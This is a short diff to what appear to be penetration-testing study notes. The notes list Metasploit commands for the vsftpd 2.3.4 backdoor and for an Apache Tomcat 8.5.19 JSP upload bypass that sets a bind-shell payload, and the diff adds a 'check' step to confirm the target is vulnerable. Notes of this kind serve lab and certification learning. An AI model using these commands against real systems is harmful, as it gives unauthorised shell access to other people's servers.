@@ -456,9 +456,11 @@ use exploit/unix/ftp/vsftpd_234_backdoor
 ### Apache Tomcat 8.5.19
 ```
 use exploit/multi/http/tomcat_jsp_upload_bypass
+check
 set payload java/jsp_shell_bind_tcp
 set SHELL cmd
 ```
+- Run `check` to make sure target is vulnerable.
 - Why use non-staged, bind shell payload?
 - If exploit fails, try again.
 
